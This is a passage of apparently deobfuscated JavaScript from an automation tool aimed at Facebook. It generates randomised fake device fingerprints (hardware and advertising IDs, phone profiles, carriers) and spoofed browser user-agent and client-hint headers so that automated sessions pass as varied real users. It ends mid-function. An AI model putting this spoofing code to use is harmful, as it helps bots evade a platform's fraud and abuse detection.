v58.name = "iPhone 14", v58.os = "17_2_1", v58.version = "17.2.1", v58.model = "iPhone14,7", v58.build = "21C66", v58.devCode = "iPhone", v58.app = "com.facebook.iphone", v58.density = "3.0", v58.w = 0x186, v58.h = 0x34c;
const v59 = {};
v59.name = "iPhone 13", v59.os = "16_6", v59.version = "16.6", v59.model = "iPhone14,5", v59.build = "20G75", v59.devCode = "iPhone", v59.app = "com.facebook.iphone", v59.density = "3.0", v59.w = 0x186, v59.h = 0x34c;
const v60 = {};
v60.name = "iPad Pro M4", v60.os = "18_2", v60.version = "18.2", v60.model = "iPad16,3", v60.build = "22C152", v60.devCode = "iPad", v60.app = "com.facebook.ipad", v60.isTablet = true, v60.density = "2.0", v60.w = 0x400, v60.h = 0x556;
const v61 = {};
v61.name = "iPad OS 18", v61.os = "18_0", v61.version = "18.0", v61.model = "iPad13,1", v61.build = "22A3354", v61.devCode = "iPad", v61.app = "com.facebook.ipad", v61.isTablet = true, v61.density = "2.0", v61.w = 0x32a, v61.h = 0x556;
const v62 = {};
v62.name = "iPad Air 5", v62.os = "17_5", v62.version = "17.5", v62.model = "iPad13,17", v62.build = "21F79", v62.devCode = "iPad", v62.app = "com.facebook.ipad", v62.isTablet = true, v62.density = "2.0", v62.w = 0x334, v62.h = 0x49c;
const IOS_DEVICES = [v51, v52, v53, v54, v55, v56, v57, v58, v59, v60, v61, v62],
  v63 = {};
v63.model = "SM-S938B", v63.cpu = "Snapdragon 8 Elite", v63.gpu = "Adreno 830", v63.ram = 0x10, v63.dpr = 0x3, v63.group = "high", v63.soc = "Qualcomm";
const v64 = {};
v64.model = "AI2401", v64.cpu = "Snapdragon 8 Gen 3", v64.gpu = "Adreno 750", v64.ram = 0x18, v64.dpr = 0x3, v64.group = "high", v64.soc = "Qualcomm";
const v65 = {};
v65.model = "CPH2581", v65.cpu = "Snapdragon 8 Gen 3", v65.gpu = "Adreno 750", v65.ram = 0x10, v65.dpr = 3.5, v65.group = "high", v65.soc = "Qualcomm";
const v66 = {};
v66.model = "SM-S911B", v66.cpu = "Snapdragon 8 Gen 2", v66.gpu = "Adreno 740", v66.ram = 0x8, v66.dpr = 2.75, v66.group = "high", v66.soc = "Qualcomm";
const v67 = {};
v67.model = "CPH2449", v67.cpu = "Snapdragon 8 Gen 2", v67.gpu = "Adreno 740", v67.ram = 0x10, v67.dpr = 3.5, v67.group = "high", v67.soc = "Qualcomm";
const v68 = {};
v68.model = "2304FPN6DG", v68.cpu = "Snapdragon 8 Gen 2", v68.gpu = "Adreno 740", v68.ram = 0xc, v68.dpr = 3.5, v68.group = "high", v68.soc = "Qualcomm";
const v69 = {};
v69.model = "XQ-DQ72", v69.cpu = "Snapdragon 8 Gen 3", v69.gpu = "Adreno 750", v69.ram = 0xc, v69.dpr = 0x3, v69.group = "high", v69.soc = "Qualcomm";
const v70 = {};
v70.model = "CPH2601", v70.cpu = "MediaTek Dimensity 9400", v70.gpu = "Immortalis-G925 MC12", v70.ram = 0x10, v70.dpr = 3.5, v70.group = "high", v70.soc = "MediaTek";
const v71 = {};
v71.model = "CPH2551", v71.cpu = "MediaTek Dimensity 9300", v71.gpu = "Immortalis-G720 MC12", v71.ram = 0x10, v71.dpr = 3.5, v71.group = "high", v71.soc = "MediaTek";
const v72 = {};
v72.model = "CPH2505", v72.cpu = "MediaTek Dimensity 8200", v72.gpu = "Mali-G610 MC6", v72.ram = 0xc, v72.dpr = 2.75, v72.group = "high", v72.soc = "MediaTek";
const v73 = {};
v73.model = "V2316", v73.cpu = "MediaTek Dimensity 9300", v73.gpu = "Immortalis-G720 MC12", v73.ram = 0x10, v73.dpr = 0x3, v73.group = "high", v73.soc = "MediaTek";
const v74 = {};
v74.model = "23113RKC6G", v74.cpu = "MediaTek Dimensity 7200-Ultra", v74.gpu = "Mali-G610 MC4", v74.ram = 0x8, v74.dpr = 2.75, v74.group = "high", v74.soc = "MediaTek";
const v75 = {};
v75.model = "NOH-NX9", v75.cpu = "Kirin 9000", v75.gpu = "Mali-G78 MP24", v75.ram = 0x8, v75.dpr = 0x3, v75.group = "high", v75.soc = "HiSilicon";
const v76 = {};
v76.model = "SM-A155F", v76.cpu = "MediaTek Helio G99", v76.gpu = "Mali-G57 MC2", v76.ram = 0x4, v76.dpr = 0x2, v76.group = "medium", v76.soc = "MediaTek";
const v77 = {};
v77.model = "V2320", v77.cpu = "MediaTek Dimensity 6020", v77.gpu = "Mali-G57 MC2", v77.ram = 0x4, v77.dpr = 0x2, v77.group = "medium", v77.soc = "MediaTek";
const v78 = {};
v78.model = "X6871", v78.cpu = "MediaTek Dimensity 8200", v78.gpu = "Mali-G610 MC6", v78.ram = 0x8, v78.dpr = 2.75, v78.group = "high", v78.soc = "MediaTek";
const v79 = {};
v79.model = "Pixel 9 Pro", v79.cpu = "Google Tensor G4", v79.gpu = "Mali-G715 MC7", v79.ram = 0x10, v79.dpr = 0x3, v79.group = "high", v79.soc = "Google";
const v80 = {};
v80.model = "Pixel 8 Pro", v80.cpu = "Google Tensor G3", v80.gpu = "Mali-G715 Immortalis MC10", v80.ram = 0xc, v80.dpr = 2.75, v80.group = "high", v80.soc = "Google";
const v81 = {};
v81.model = "Pixel 8", v81.cpu = "Google Tensor G3", v81.gpu = "Mali-G715 Immortalis MC10", v81.ram = 0x8, v81.dpr = 2.75, v81.group = "high", v81.soc = "Google";
const ANDROID_DEVICE_PROFILES = [v63, v64, v65, v66, v67, v68, v69, v70, v71, v72, v73, v74, v75, v76, v77, v78, v79, v80, v81],
  v82 = {};
v82.model = "iPhone17,2", v82.family = "iPhone", v82.osVer = "18.3", v82.cpu = "Apple A18 Pro", v82.gpu = "Apple G18P (6-core)", v82.ram = 0x8, v82.dpr = 0x3, v82.group = "high", v82.soc = "Apple";
const v83 = {};
v83.model = "iPhone17,1", v83.family = "iPhone", v83.osVer = "18.2", v83.cpu = "Apple A18 Pro", v83.gpu = "Apple G18P (6-core)", v83.ram = 0x8, v83.dpr = 0x3, v83.group = "high", v83.soc = "Apple";
const v84 = {};
v84.model = "iPhone16,2", v84.family = "iPhone", v84.osVer = "18.3", v84.cpu = "Apple A17 Pro", v84.gpu = "Apple G17P (6-core)", v84.ram = 0x8, v84.dpr = 0x3, v84.group = "high", v84.soc = "Apple";
const v85 = {};
v85.model = "iPhone16,1", v85.family = "iPhone", v85.osVer = "18.2", v85.cpu = "Apple A17 Pro", v85.gpu = "Apple G17P (6-core)", v85.ram = 0x8, v85.dpr = 0x3, v85.group = "high", v85.soc = "Apple";
const v86 = {};
v86.model = "iPhone15,4", v86.family = "iPhone", v86.osVer = "18.1", v86.cpu = "Apple A16 Bionic", v86.gpu = "Apple G16 (5-core)", v86.ram = 0x6, v86.dpr = 0x3, v86.group = "medium", v86.soc = "Apple";
const v87 = {};
v87.model = "iPhone15,3", v87.family = "iPhone", v87.osVer = "18.1", v87.cpu = "Apple A16 Bionic";
v87.gpu = "Apple G16 (5-core)", v87.ram = 0x6, v87.dpr = 0x3, v87.group = "medium", v87.soc = "Apple";
const v88 = {};
v88.model = "iPhone14,8", v88.family = "iPhone", v88.osVer = "17.2", v88.cpu = "Apple A15 Bionic", v88.gpu = "Apple G15 (5-core)", v88.ram = 0x6, v88.dpr = 0x3, v88.group = "medium", v88.soc = "Apple";
const v89 = {};
v89.model = "iPhone14,2", v89.family = "iPhone", v89.osVer = "17.5", v89.cpu = "Apple A15 Bionic", v89.gpu = "Apple G15 (5-core)", v89.ram = 0x6, v89.dpr = 0x3, v89.group = "medium", v89.soc = "Apple";
const v90 = {};
v90.model = "iPhone13,3", v90.family = "iPhone", v90.osVer = "16.7", v90.cpu = "Apple A14 Bionic", v90.gpu = "Apple G14 (4-core)", v90.ram = 0x6, v90.dpr = 0x3, v90.group = "medium", v90.soc = "Apple";
const v91 = {};
v91.model = "iPhone12,1", v91.family = "iPhone", v91.osVer = "16.6", v91.cpu = "Apple A13 Bionic", v91.gpu = "Apple G13 (4-core)", v91.ram = 0x4, v91.dpr = 0x2, v91.group = "medium", v91.soc = "Apple";
const IOS_DEVICE_PROFILES = [v82, v83, v84, v85, v86, v87, v88, v89, v90, v91],
  v92 = {};
v92.ver = "18_5", v92.build = "22F76", v92.osTag = "18.5";
const v93 = {};
v93.ver = "18_3", v93.build = "22D60", v93.osTag = "18.3";
const v94 = {};
v94.ver = "18_2", v94.build = "22C152", v94.osTag = "18.2";
const v95 = {};
v95.ver = "18_1", v95.build = "22B83", v95.osTag = "18.1";
const v96 = {};
v96.ver = "17_4_1", v96.build = "21E236", v96.osTag = "17.4.1";
const v97 = {};
v97.ver = "17_2", v97.build = "21C62", v97.osTag = "17.2";
const v98 = {};
v98.ver = "16_2", v98.build = "20C65", v98.osTag = "16.2";
const v99 = {};
v99.ver = "15_4", v99.build = "19E241", v99.osTag = "15.4";
const IOS_VERSIONS_FP = [v92, v93, v94, v95, v96, v97, v98, v99],
  ANDROID_OS_VERSIONS = ['12', '13', '14', '15'],
  GPS_VERSIONS = ["24.08.12", "24.10.15", "24.15.18", "24.20.13", "24.23.35", "24.26.31", "24.33.32", "24.36.15", "24.39.14", "24.42.12", "24.45.17", "25.02.34", "25.08.13", "26.04.11"],
  IT_OPERATORS = ["WindTre", "TIM IT", "Vodafone IT", "Iliad IT"],
  US_OPERATORS = ["T-Mobile", "AT&T", "Verizon", "Google Fi"],
  GENERIC_OPERATORS = ["Vodafone", "Orange", "T-Mobile", "Claro", "Rogers", "Glo", "MTN"],
  CONNECTION_TYPES_FP = ["WIFI", "MOBILE_LTE", "MOBILE_5G"];
function getSimOperators(v332) {
  if (v332 === 'IT') return IT_OPERATORS;
  if (v332 === 'US') return US_OPERATORS;
  return GENERIC_OPERATORS;
}
function generateDeviceFingerprint(v333, v334) {
  const v335 = v333 === "android" ? "android" : v333 === "ios" ? "ios" : Math.random() > 0.4 ? "android" : "ios",
    v336 = CONNECTION_TYPES_FP[Math.floor(Math.random() * CONNECTION_TYPES_FP.length)],
    v337 = Math.floor(Math.random() * 0x50) + 0xf,
    v338 = Math.random() > 0.7 ? 0x1 : 0x0,
    v339 = Math.floor(Math.random() * 0x3d090) + 0x7530,
    v340 = Math.floor(Math.random() * v339 * 0.7),
    v341 = Math.floor(Math.random() * 0xaba9500) + 0xe4e1c0;
  const v342 = v334 || IT_OPERATORS;
  if (v335 === "android") {
    const v343 = ANDROID_DEVICE_PROFILES[Math.floor(Math.random() * ANDROID_DEVICE_PROFILES.length)],
      v344 = ANDROID_OS_VERSIONS[Math.floor(Math.random() * ANDROID_OS_VERSIONS.length)],
      v345 = v342[Math.floor(Math.random() * v342.length)],
      v346 = GPS_VERSIONS[Math.floor(Math.random() * GPS_VERSIONS.length)];
    return {
      'platform': "android",
      'androidVersion': v344,
      'model': v343.model,
      'cpu': v343.cpu,
      'gpu': v343.gpu,
      'ram': v343.ram,
      'dpr': v343.dpr,
      'deviceGroup': v343.group,
      'socManufacturer': v343.soc,
      'hwid': uuid(),
      'bootId': uuid(),
      'advertisingId': uuid(),
      'sessionId': uuid(),
      'connType': v336,
      'networkQuality': "EXCELLENT",
      'simOperator': v345,
      'battery': v337,
      'isCharging': v338,
      'uptime': v339,
      'fgTime': v340,
      'bandwidth': v341,
      'gpsVersion': v346
    };
  } else {
    const v347 = IOS_DEVICE_PROFILES[Math.floor(Math.random() * IOS_DEVICE_PROFILES.length)],
      v348 = IOS_VERSIONS_FP[Math.floor(Math.random() * IOS_VERSIONS_FP.length)],
      v349 = v342[Math.floor(Math.random() * v342.length)],
      fn5 = () => uuid().toUpperCase();
    return {
      'platform': "ios",
      'iosVersion': v348,
      'model': v347.model,
      'family': v347.family,
      'osVersion': v347.osVer,
      'cpu': v347.cpu,
      'gpu': v347.gpu,
      'ram': v347.ram,
      'dpr': v347.dpr,
      'deviceGroup': v347.group,
      'socManufacturer': v347.soc,
      'hwid': uuid(),
      'bootId': fn5(),
      'advertisingId': fn5(),
      'sessionId': uuid(),
      'connType': v336,
      'networkQuality': "EXCELLENT",
      'simOperator': v349,
      'battery': v337,
      'isCharging': v338,
      'uptime': v339,
      'fgTime': v340,
      'bandwidth': v341
    };
  }
}
const v100 = {};
v100["138"] = "\"Not=A?Brand\";v=\"99\"", v100["139"] = "\"Not;A=Brand\";v=\"8\"", v100["140"] = "\"Not(A;Brand\";v=\"24\"", v100["141"] = "\"Not A(Brand\";v=\"99\"", v100["142"] = "\"Not_A Brand\";v=\"8\"", v100["143"] = "\"Not;A=Brand\";v=\"24\"", v100["144"] = "\"Not=A?Brand\";v=\"99\"", v100["145"] = "\"Not;A=Brand\";v=\"8\"", v100["146"] = "\"Not;A=Brand\";v=\"24\"", v100["147"] = "\"Not_A Brand\";v=\"8\"", v100["148"] = "\"Not A(Brand\";v=\"99\"", v100["149"] = "\"Not(A;Brand\";v=\"24\"", v100["150"] = "\"Not;A=Brand\";v=\"8\"", v100["151"] = "\"Not=A?Brand\";v=\"99\"";
v100["152"] = "\"Not?A_Brand\";v=\"24\"", v100["153"] = "\"Not_A Brand\";v=\"8\"", v100["154"] = "\"Not=A?Brand\";v=\"99\"";
const GREASE_MAP_FP = v100;
function getRandomClient(v350, v351) {
  let v352 = v350;
  (!v352 || v352 === SELECTED_BROWSER) && (SELECTED_BROWSERS && SELECTED_BROWSERS.length > 0x1 ? v352 = SELECTED_BROWSERS[Math.floor(Math.random() * SELECTED_BROWSERS.length)] : v352 = SELECTED_BROWSER);
  const v353 = FB_HOST === "m.facebook.com" || SELECTED_LANG === "m.facebook.com";
  v353 && (v352 === "random" || !v352) && (v352 = "random_mobile");
  if (v352 === "random_mobile") {
    const v357 = ["mweb_pixel8", "ios", "android", "via_browser", "samsung", "mobile_firefox", "mobile_brave", "mobile_opera"];
    v352 = v357[Math.floor(Math.random() * v357.length)];
  }
  if (v352 === "mweb_pixel8") {
    const v358 = getPixel8MobileUA(),
      v359 = {
        ...v358
      };
    return v359.device = null, v359;
  }
  if (v352 === "via_browser") {
    const v360 = getViaBrowserUA(),
      v361 = {
        ...v360
      };
    return v361.device = null, v361;
  }
  if (v352 === "samsung") {
    const v362 = getSamsungUserAgent(),
      v363 = {
        ...v362
      };
    return v363.device = null, v363;
  }
  if (v352 === "mobile_firefox") {
    const v364 = getMobileFirefoxUA(),
      v365 = {
        ...v364
      };
    return v365.device = null, v365;
  }
  if (v352 === "mobile_brave") {
    const v366 = getMobileBraveUA(),
      v367 = {
        ...v366
      };
    return v367.device = null, v367;
  }
  if (v352 === "mobile_opera") {
    const v368 = getMobileOperaUA(),
      v369 = {
        ...v368
      };
    return v369.device = null, v369;
  }
  const v354 = v352 === "android" || v352 === "ios";
  if (!v354) {
    const v370 = getRandomUserAgent(v352),
      v371 = {
        ...v370
      };
    return v371.device = null, v371;
  }
  const v355 = v352 === "android" ? "android" : v352 === "ios" ? "ios" : "random",
    v356 = generateDeviceFingerprint(v355, v351 || IT_OPERATORS);
  if (v356.platform === "ios") {
    const {
        iosVersion: v372
      } = v356,
      v373 = typeof mfbGenIosUA === "function" ? mfbGenIosUA() : "Mozilla/5.0 (iPhone; CPU iPhone OS " + v372.ver + " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + v372.ver.replace(/_/g, '.').split('.').slice(0x0, 0x2).join('.') + ".0 Mobile/" + v372.build + " Safari/605.1",
      v374 = {};
    v374.w = 0x186, v374.h = 0x34c, v374.dpr = v356.dpr, v374.cores = 0x8, v374.ram = v356.ram;
    const v375 = {};
    return v375.name = "iOS Safari (iPhone)", v375.userAgent = v373, v375.browserType = "safari", v375.isMobile = true, v375.clientHints = {}, v375.hw = v374, v375.device = v356, v375;
  } else {
    const v376 = Math.floor(Math.random() * 6) + 0x94,
      v377 = Math.floor(Math.random() * 0xc8) + 0x1edc,
      v378 = Math.floor(Math.random() * 0x96) + 0x28,
      v379 = GREASE_MAP_FP[v376] || "\"Not?A_Brand\";v=\"24\"",
      v380 = "Mozilla/5.0 (Linux; Android " + v356.androidVersion + ';\x20' + v356.model + " Build/TP1A.231011.067) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v376 + ".0.0.0 Mobile Safari/537.36";
    return {
      'name': "Android Chrome",
      'userAgent': v380,
      'browserType': "chrome",
      'isMobile': true,
      'clientHints': {
        'sec-ch-ua': "\"Chromium\";v=\"" + v376 + "\", " + v379 + ", \"Google Chrome\";v=\"" + v376 + '\x22',
        'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v376 + ".0." + v377 + '.' + v378 + "\", " + v379.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v376 + ".0." + v377 + '.' + v378 + '\x22',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': "\"Android\"",
        'sec-ch-ua-platform-version': '\x22' + v356.androidVersion + ".0.0\"",
        'sec-ch-ua-model': '\x22' + v356.model + '\x22',
        'sec-gpc': '1'
      },
      'hw': {
        'w': 0x19c,
        'h': 0x393,
        'dpr': v356.dpr,
        'cores': 0x8,
        'ram': v356.ram
      },
      'device': v356
    };
  }
}
function getSamsungUserAgent() {
  const v381 = ANDROID_DEVICES.filter(v385 => v385.brand === "Samsung"),
    v382 = v381[Math.floor(Math.random() * v381.length)] || ANDROID_DEVICES[0x0];
  const v383 = SAMSUNG_VERSIONS[Math.floor(Math.random() * SAMSUNG_VERSIONS.length)];
  const v384 = v383.chrome.split('.')[0x0];
  return {
    'name': "Samsung Internet",
    'userAgent': "Mozilla/5.0 (Linux; Android " + v382.os + ';\x20' + v382.model + ") AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/" + v383.ver + " Chrome/" + v384 + ".0.0.0 Mobile Safari/537.36",
    'browserType': "samsung",
    'isMobile': true,
    'clientHints': {
      'sec-ch-ua': "\"Not?A_Brand\";v=\"24\", \"Samsung Internet\";v=\"" + v383.ver.split('.')[0x0] + "\", \"Chromium\";v=\"" + v384 + '\x22',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-model': '\x22' + v382.model + '\x22',
      'sec-ch-ua-platform': "\"Android\"",
      'sec-ch-ua-platform-version': '\x22' + v382.os + ".0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopChromeUA() {
  const v386 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v387 = Math.floor(Math.random() * (v386.maxPatch - v386.minPatch + 0x1)) + v386.minPatch,
    v388 = v386.major + ".0." + v386.build + '.' + v387,
    v389 = GREASE_MAP_FP[v386.major] || "\"Not?A_Brand\";v=\"24\"",
    v390 = ["\"10.0.0\"", "\"15.0.0\"", "\"19.0.0\""],
    v391 = v390[Math.floor(Math.random() * v390.length)];
  return {
    'name': "Windows Chrome",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v386.major + ".0.0.0 Safari/537.36",
    'browserType': "chrome",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v386.major + "\", " + v389 + ", \"Google Chrome\";v=\"" + v386.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v388 + "\", " + v389.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v388 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': v391,
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopLinuxChromeUA() {
  const v392 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v393 = Math.floor(Math.random() * (v392.maxPatch - v392.minPatch + 0x1)) + v392.minPatch,
    v394 = v392.major + ".0." + v392.build + '.' + v393,
    v395 = GREASE_MAP_FP[v392.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Linux Chrome",
    'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v392.major + ".0.0.0 Safari/537.36",
    'browserType': "chrome_linux",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v392.major + "\", " + v395 + ", \"Google Chrome\";v=\"" + v392.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v394 + "\", " + v395.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v394 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Linux\"",
      'sec-ch-ua-platform-version': '\x22\x22',
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopLinuxFirefoxUA() {
  const v396 = Math.floor(Math.random() * 0xf) + 0x82;
  const v397 = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:" + v396 + ".0) Gecko/20100101 Firefox/" + v396 + '.0', "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:" + v396 + ".0) Gecko/20100101 Firefox/" + v396 + '.0', "Mozilla/5.0 (X11; Linux x86_64; rv:" + v396 + ".0) Gecko/20100101 Firefox/" + v396 + '.0'];
  return {
    'name': "Linux Firefox",
    'userAgent': v397[Math.floor(Math.random() * v397.length)],
    'browserType': "firefox_linux",
    'isMobile': false,
    'clientHints': {}
  };
}
function getDesktopLinuxBraveUA() {
  const v398 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v399 = Math.floor(Math.random() * (v398.maxPatch - v398.minPatch + 0x1)) + v398.minPatch,
    v400 = v398.major + ".0." + v398.build + '.' + v399;
  const v401 = GREASE_MAP_FP[v398.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Linux Brave",
    'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v398.major + ".0.0.0 Safari/537.36",
    'browserType': "brave_linux",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Brave\";v=\"" + v398.major + "\", " + v401 + ", \"Chromium\";v=\"" + v398.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Brave\";v=\"" + v400 + "\", " + v401.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Chromium\";v=\"" + v400 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Linux\"",
      'sec-ch-ua-platform-version': '\x22\x22',
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopLinuxEdgeUA() {
  const v402 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v403 = Math.floor(Math.random() * (v402.maxPatch - v402.minPatch + 0x1)) + v402.minPatch;
  const v404 = v402.major + ".0." + v402.build + '.' + v403;
  const v405 = GREASE_MAP_FP[v402.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Linux Edge",
    'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v402.major + ".0.0.0 Safari/537.36 Edg/" + v402.major + ".0.0.0",
    'browserType': "edge_linux",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v402.major + "\", " + v405 + ", \"Microsoft Edge\";v=\"" + v402.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v404 + "\", " + v405.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Microsoft Edge\";v=\"" + v404 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Linux\"",
      'sec-ch-ua-platform-version': '\x22\x22',
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopEdgeUA() {
  const v406 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v407 = Math.floor(Math.random() * (v406.maxPatch - v406.minPatch + 0x1)) + v406.minPatch,
    v408 = v406.major + ".0." + v406.build + '.' + v407,
    v409 = GREASE_MAP_FP[v406.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Windows Edge",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v406.major + ".0.0.0 Safari/537.36 Edg/" + v406.major + ".0.0.0",
    'browserType': "edge",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v406.major + "\", " + v409 + ", \"Microsoft Edge\";v=\"" + v406.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v408 + "\", " + v409.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Microsoft Edge\";v=\"" + v408 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopFirefoxUA() {
  const v410 = Math.floor(Math.random() * 0x12) + 0x87,
    v411 = {};
  v411.name = "Windows Firefox", v411.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:" + v410 + ".0) Gecko/20100101 Firefox/" + v410 + '.0', v411.browserType = "firefox";
  return v411.isMobile = false, v411.clientHints = {}, v411;
}
function getDuckDuckGoDesktopUA() {
  const v412 = {};
  v412.major = 0x97;
  v412.build = 0x1ef2;
  v412.minPatch = 0x32, v412.maxPatch = 0xb4;
  const v413 = CHROME_VERSIONS.find(v416 => v416.major === 0x97) || v412,
    v414 = v413.major + ".0." + v413.build + '.' + 0x8a,
    v415 = GREASE_MAP_FP[v413.major] || "\"Not=A?Brand\";v=\"99\"";
  return {
    'name': "DuckDuckGo Windows",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v413.major + ".0.0.0 Safari/537.36",
    'browserType': "duckduckgo",
    'isMobile': false,
    'clientHints': {
      'sec-ch-prefers-color-scheme': "dark",
      'sec-ch-ua': "\"Chromium\";v=\"" + v413.major + "\", " + v415 + ", \"Google Chrome\";v=\"" + v413.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v414 + "\", " + v415.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v414 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-gpc': '1'
    },
    'duckduckgo': true
  };
}
function getDesktopOperaUA() {
  const v417 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v418 = Math.floor(Math.random() * (v417.maxPatch - v417.minPatch + 0x1)) + v417.minPatch,
    v419 = v417.major + ".0." + v417.build + '.' + v418;
  const v420 = Math.max(0x69, v417.major - 0xa),
    v421 = GREASE_MAP_FP[v417.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Windows Opera",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v417.major + ".0.0.0 Safari/537.36 OPR/" + v420 + ".0.0.0",
    'browserType': "opera",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v417.major + "\", " + v421 + ", \"Opera\";v=\"" + v420 + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v419 + "\", " + v421.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Opera\";v=\"" + v420 + ".0.0.0\"",
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getMobileOperaUA() {
  const v422 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v423 = Math.floor(Math.random() * (v422.maxPatch - v422.minPatch + 0x1)) + v422.minPatch,
    v424 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v425 = Math.max(0x50, v422.major - 0x3c),
    v426 = GREASE_MAP_FP[v422.major] || "\"Not?A_Brand\";v=\"24\"",
    v427 = {};
  v427.name = "Android Opera", v427.userAgent = "Mozilla/5.0 (Linux; Android " + v424.os + ';\x20' + v424.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v422.major + ".0.0.0 Mobile Safari/537.36 OPR/" + v425 + ".0.0.0", v427.browserType = "opera";
  v427.isMobile = true, v427.clientHints = {}, v427.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v422.major + "\", " + v426 + ", \"Opera\";v=\"" + v425 + '\x22';
  return v427.clientHints["sec-ch-ua-mobile"] = '?1', v427.clientHints["sec-ch-ua-model"] = '\x22' + v424.model + '\x22', v427.clientHints["sec-ch-ua-platform"] = "\"Android\"", v427.clientHints["sec-ch-ua-platform-version"] = '\x22' + v424.os + ".0.0\"", v427.clientHints["sec-ch-prefers-color-scheme"] = "dark", v427;
}
function getDesktopBraveUA() {
  const v428 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
  const v429 = Math.floor(Math.random() * (v428.maxPatch - v428.minPatch + 0x1)) + v428.minPatch,
